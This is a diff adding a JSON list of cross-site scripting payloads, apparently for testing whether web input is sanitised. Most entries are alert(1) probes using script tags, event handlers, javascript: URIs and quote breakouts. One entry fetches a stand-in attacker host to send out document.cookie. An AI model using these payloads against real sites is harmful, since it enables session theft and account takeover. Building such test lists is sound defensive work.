@@ -1,0 +1,22 @@
+[
+  "<script>alert(1)</script>",
+  "<img src=x onerror=alert(1)>",
+  "<svg onload=alert(1)>",
+  "<iframe src=\"javascript:alert(1)\"></iframe>",
+  "<body onload=alert(1)>",
+  "<input autofocus onfocus=alert(1)>",
+  "<details open ontoggle=alert(1)>",
+  "<marquee onstart=alert(1)>",
+  "javascript:alert(1)",
+  "\"><script>alert(1)</script>",
+  "';alert(1)//",
+  "\"-alert(1)-\"",
+  "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
+  "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
+  "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
+  "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
+  "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
+  "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
+  "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
+  "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>"
+]
